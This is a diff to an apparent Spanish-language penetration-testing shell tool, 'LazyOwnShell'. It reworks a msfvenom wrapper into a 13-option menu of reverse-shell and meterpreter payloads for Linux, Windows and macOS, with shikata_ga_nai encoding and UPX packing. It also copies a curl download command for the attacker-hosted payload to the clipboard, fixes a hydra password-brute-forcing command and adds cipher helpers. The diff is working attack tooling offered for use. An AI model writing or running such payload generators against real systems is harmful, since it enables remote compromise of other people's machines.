@@ -9,6 +9,9 @@ import signal
 import json
 import time
 import base64
+import string
+import glob
+from modules.lazyencoder_decoder import encode, decode
 from cmd import Cmd
 
 
@@ -182,6 +185,14 @@ def find_credentials(directory):
                             print_msg(f"{match}")
             except Exception as e:
                 print_error(f"No se pudo leer el archivo {file}: {e}")
+        # Define the rotation function
+def rotate_char(c, shift):
+    """Internal function to rotate characters to command rot, more info help rot"""
+    if c in string.ascii_letters:
+        start = ord('a') if c.islower() else ord('A')
+        return chr((ord(c) - start + shift) % 26 + start)
+    return c
+
 
 version = "v0.0.12"
 # Definimos algunos códigos de escape ANSI para colores
@@ -216,7 +227,7 @@ COMMAND = None
 RUN_AS_ROOT = False
 
 
-BANNER = f"""{WHITE}{BG_BLACK}
+BANNER = f"""{GREEN}{BG_BLACK}
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⡤⠴⠶⠖⠒⠛⠛⠀⠀⠀⠒⠒⢰⠖⢠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣭⠷⠞⠉⠫⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠈⠉⠒⠲⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -878,52 +889,88 @@ class LazyOwnShell(Cmd):
         """Run alias of msfvenom alias venom"""
         lhost = self.params["lhost"]
         lport = self.params["lport"]
-        path = os.getcwd()
+        
         if not lhost or not lport:
-            print_error("lport and lhost mus be set")
+            print_error("lport and lhost must be set")
             return
-        os.system(
-            f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf'
-        )
-        os.system(
-            f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell64.elf'
-        )
-        os.system(
-            f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe'
-        )
-        os.system(
-            f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe'
-        )
-        os.system(
-            f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho'
-        )
-        os.system(
-            f'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho'
-        )
-        command = (
-            f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} '
-            '-b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c'
-        )
 
-        os.system(command)
-        print_msg(command)
-        print_msg(f"LHOST={lhost} LPORT={lport}")
+        # Prompt user for choice
+        print_msg("Select payload type:")
+        print_msg("1: linux/x86/meterpreter/reverse_tcp")
+        print_msg("2: linux/x64/meterpreter/reverse_tcp")
+        print_msg("3: windows/meterpreter/reverse_tcp")
+        print_msg("4: windows/x64/meterpreter/reverse_tcp")
+        print_msg("5: osx/x86/meterpreter/reverse_tcp")
+        print_msg("6: osx/x64/meterpreter/reverse_tcp")
+        print_msg("7: linux/x86/shell_reverse_tcp")
+        print_msg("8: linux/x64/shell_reverse_tcp")
+        print_msg("9: windows/shell_reverse_tcp")
+        print_msg("10: windows/x64/shell_reverse_tcp")
+        print_msg("11: osx/x86/shell_reverse_tcp")
+        print_msg("12: osx/x64/shell_reverse_tcp")
+        print_msg("13: linux/x86/meterpreter/reverse_tcp (C - shikata_ga_nai)")
+        choice = input("Enter your choice (1-13): ").strip()
 
-        os.system("mv shell* sessions")
-        os.system("chmod +x sessions/shell*")
-        print_msg(f"Lazy MSFVenom Reverse_shell payloads in sessions/ ")
-        print_msg(f"{MAGENTA}upx to bins to smaller bins{CYAN}")
-        os.system("upx sessions/shell.elf")
-        os.system("upx sessions/shell.macho")
-        os.system("upx sessions/shell.exe")
-        os.system("upx sessions/shell64.elf")
-        os.system("upx sessions/shell64.macho")
-        os.system("upx sessions/shell64.exe")
-        os.system(f"echo 'curl http://{lhost}/shell.exe -o s.exe' | xclip -sel clip")
-        print_msg(
-            f"To run web server exec command: {GREEN}www {YELLOW}or {GREEN}lazywebshell {RED}[;,;] curl http://{lhost}/shell.exe -o s.exe copy to clipboard :D {RESET}"
-        )
-        return
+        # Define payload commands
+        commands = {
+            "1": f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf',
+            "2": f'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell64.elf',
+            "3": f'msfvenom -p windows/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe',
+            "4": f'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe',
+            "5": f'msfvenom -p osx/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho',
+            "6": f'msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho',
+            "7": f'msfvenom -p linux/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell.elf',
+            "8": f'msfvenom -p linux/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f elf > shell64.elf',
+            "9": f'msfvenom -p windows/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell.exe',
+            "10": f'msfvenom -p windows/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f exe > shell64.exe',
+            "11": f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho',
+            "12": f'msfvenom -p osx/x64/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell64.macho',
+            "13": (
+                f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="{lhost}" LPORT={lport} '
+                '-b "\\x00\\x0a\\x0d" -e x86/shikata_ga_nai -f c > payload.c'
+            ),
+        }
+
+        # Check if the choice is valid
+        if choice in commands:
+            # Execute the chosen command
+            os.system(commands[choice])
+            print_msg(f"Generated payload: {commands[choice]}")
+
+            # Move and set permissions for the generated payload
+            if choice in commands:
+                os.system("mkdir -p sessions")
+                os.system("mv shell* sessions 2>/dev/null")  # Move files and suppress errors if no files match
+                os.system("chmod +x sessions/shell*")
+
+            print_msg("Payloads moved to sessions/")
+
+            # Apply UPX to compress the payloads if applicable
+            if choice in ["1", "2", "7", "8"]:
+                if os.path.exists("sessions/shell.elf"):
+                    os.system("upx sessions/shell.elf")
+                if os.path.exists("sessions/shell64.elf"):
+                    os.system("upx sessions/shell64.elf")
+            if choice in ["3", "4", "9", "10"]:
+                if os.path.exists("sessions/shell.exe"):
+                    os.system("upx sessions/shell.exe")
+                if os.path.exists("sessions/shell64.exe"):
+                    os.system("upx sessions/shell64.exe")
+            if choice in ["5", "6", "11", "12"]:
+                if os.path.exists("sessions/shell.macho"):
+                    os.system("upx sessions/shell.macho")
+                if os.path.exists("sessions/shell64.macho"):
+                    os.system("upx sessions/shell64.macho")
+            if choice == "13":
+                # Handle the payload in C (shikata_ga_nai)
+                if os.path.exists("payload.c"):
+                    print_msg("Payload in C generated: payload.c")
+                    os.system(f"echo 'curl http://{lhost}/payload.c -o payload.c' | xclip -sel clip")
+                    print_msg(f"To run web server exec command: curl http://{lhost}/payload.c -o payload.c copied to clipboard")
+
+        else:
+            print_error("Invalid choice. Please select a number between 1 and 13.")
+
 
     def run_lazyaslrcheck(self):
         """Aslr check if is active """
@@ -1785,6 +1832,18 @@ class LazyOwnShell(Cmd):
         os.system(f"hashcat -a 0 -m {line} {wordlist}")
         return
 
+    def complete_hashcat(self, text, line, begidx, endidx):
+        """Complete mode options and file paths for the sessions/hash.txt"""
+        parts = line.split()
+
+        if len(parts) == 1:
+            return [str(x) for x in range(0, 20000) if str(x).startswith(text)]  # Modify the range as needed for mode options
+        
+        if len(parts) == 2:
+            return [f for f in glob.glob('sessions/hash.txt') if f.startswith(text)]
+
+        return []
+
     def do_responder(self, line):
         """sudo responder -I tun0"""
         device = self.params["device"]
@@ -2217,6 +2276,79 @@ class LazyOwnShell(Cmd):
         os.system(f"snmp-check {rhost}")
         return
 
+    def do_encode(self, line):
+        """Encodes a string with the given shift value and substitution key"""
+        parts = line.split(' ', 2)
+        if len(parts) != 3:
+            print_error("Usage: encode <shift_value> <substitution_key> <string>")
+            return
+
+        try:
+            shift_value = int(parts[0])
+            substitution_key = parts[1]
+            input_string = parts[2]
+        except ValueError:
+            print_error("Error: Shift value must be an integer")
+            return
+
+        # Encode the input string
+        encoded_string = encode(input_string, shift_value, substitution_key)
+        print_msg(f"Encoded string: {encoded_string}")
+        return
+
+    def do_decode(self, line):
+        """Decodes a string with the given shift value and substitution key"""
+        parts = line.split(' ', 2)
+        if len(parts) != 3:
+            print_error("Usage: decode <shift_value> <substitution_key> <string>")
+            return
+
+        try:
+            shift_value = int(parts[0])
+            substitution_key = parts[1]
+            input_string = parts[2]
+        except ValueError:
+            print_error("Error: Shift value must be an integer")
+            return
+
+        # Decode the input string
+        decoded_string = decode(input_string, shift_value, substitution_key)
+        print_msg(f"Decoded string: {decoded_string}")
+        return
+
+    def do_rot(self, line):
+        """
+        Apply ROT13 substitution cipher to the given string.
+
+        Usage:
+            rot <number> '<string>'
+        """
+        
+
+        # Split the line into parts
+        parts = line.split("'", 1)
+        if len(parts) != 2:
+            print_error("Usage: rot <number> '<string>'")
+            return
+
+        # Extract the number and text
+        number_str = parts[0].strip()
+        text = parts[1].strip().strip("'")
+
+        # Validate the number
+        try:
+            number = int(number_str)
+            if not (1 <= number <= 27):
+                raise ValueError("Number must be between 1 and 27.")
+        except ValueError as e:
+            print_error(f"Invalid number: {e}")
+            return
+
+        # Apply the rotation
+        rotated_text = ''.join(rotate_char(c, number) for c in text)
+        print_msg(rotated_text)
+        return
+
     def do_hydra(self, line):
         """hydra -f -L sessions/users.txt -P /usr/share/wordlists/rockyou.txt 10.10.11.9 -s 5000 https-get /v2/"""
         rhost = self.params["rhost"]
@@ -2234,8 +2366,8 @@ class LazyOwnShell(Cmd):
         if len(args) < 2:
             print_error("you need pass the path to crack and the port example hydra /login/ 8080")
             return
-        print_msg(f"Try... hydra -f -L sessions/users.txt -P {wordlist} {rhost} -s {args[1]} https-get {args[0]}")
-        os.system(f"hydra -f -L sessions/users.txt -P {wordlist} {rhost} -s {args[1]} https-get {args[0]}")
+        print_msg(f"Try... hydra -f -L sessions/users.txt -P {wordlist} {rhost} -s {args[1]} http-get {args[0]}")
+        os.system(f"hydra -f -L sessions/users.txt -P {wordlist} {rhost} -s {args[1]} http-get {args[0]}")
         return
 
     def do_smtpuserenum(self, line):
@@ -2556,18 +2688,66 @@ class LazyOwnShell(Cmd):
             if len(args) == 1:
                 setpayload = "windows/meterpreter/reverse_tcp"
             elif len(args) == 2:
-                if args[1] == "win":
-                    setpayload = "windows/meterpreter/reverse_tcp"
-                if args[1] == "win64":
-                    setpayload = "windows/x64/meterpreter/reverse_tcp"
-                elif args[1] == "lin":
-                    setpayload = "linux/x86/meterpreter/reverse_tcp"
-                elif args[1] == "lin64":
-                    setpayload = "linux/x64/meterpreter/reverse_tcp"
-                elif args[1] == "mac":
-                    setpayload = "osx/x86/shell_reverse_tcp"
-                elif args[1] == "mac64":
-                    setpayload = "osx/x64/meterpreter/reverse_tcp"
+                if args[1] in ["win", "win64", "lin", "lin64", "mac", "mac64"]:
+                    print_msg("Select payload type:")
+                    print_msg("1: With meterpreter")
+                    print_msg("2: Without meterpreter")
+                    choice = input("Enter your choice (1 or 2): ").strip()
+
+                    if args[1] == "win":
+                        if choice == "1":
+                            setpayload = "windows/meterpreter/reverse_tcp"
+                        elif choice == "2":
+                            setpayload = "windows/shell_reverse_tcp"
+                        else:
+                            print_error("Invalid choice")
+                            return
+                    elif args[1] == "win64":
+                        if choice == "1":
+                            setpayload = "windows/x64/meterpreter/reverse_tcp"
+                        elif choice == "2":
+                            setpayload = "windows/x64/shell_reverse_tcp"
+                        else:
+                            print_error("Invalid choice")
+                            return
+                    elif args[1] == "lin":
+                        if choice == "1":
+                            setpayload = "linux/x86/meterpreter/reverse_tcp"
+                        elif choice == "2":
+                            setpayload = "linux/x86/shell_reverse_tcp"
+                        else:
+                            print_error("Invalid choice")
+                            return
+                    elif args[1] == "lin64":
+                        if choice == "1":
+                            setpayload = "linux/x64/meterpreter/reverse_tcp"
+                        elif choice == "2":
+                            setpayload = "linux/x64/shell_reverse_tcp"
+                        else:
+                            print_error("Invalid choice")
+                            return
+                    elif args[1] == "mac":
+                        if choice == "1":
+                            setpayload = "osx/x86/meterpreter/reverse_tcp"
+                        elif choice == "2":
+                            setpayload = "osx/x86/shell_reverse_tcp"
+                        else:
+                            print_error("Invalid choice")
+                            return
+                    elif args[1] == "mac64":
+                        if choice == "1":
+                            setpayload = "osx/x64/meterpreter/reverse_tcp"
+                        elif choice == "2":
+                            setpayload = "osx/x64/shell_reverse_tcp"
+                        else:
+                            print_error("Invalid choice")
+                            return
+
+                    print_msg(f"Selected payload: {setpayload}")
+
+                    # Here you would continue with the rest of your function, using the `setpayload` value
+                else:
+                    print_error("Invalid platform specified")
 
             lhost = self.params["lhost"]
             lport = self.params["lport"]
